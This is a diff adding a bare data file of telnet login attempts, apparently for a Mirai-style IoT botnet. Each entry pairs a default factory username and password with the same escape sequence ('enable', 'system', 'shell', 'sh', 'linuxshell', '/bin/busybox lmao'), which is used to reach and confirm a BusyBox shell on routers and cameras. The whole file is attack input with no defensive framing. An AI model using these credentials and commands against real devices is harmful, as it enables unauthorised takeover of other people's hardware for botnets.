@@ -1,0 +1,81 @@
+root
+12345
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+root
+123456
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+root
+root
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+default
+default
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+default
+default
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+guest
+12345
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+root
+5up
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+default
+s2fgqnfs
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+admin
+ho4uku6at
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
+root
+pass
+
+enable
+system
+shell
+sh
+linuxshell
+/bin/busybox lmao
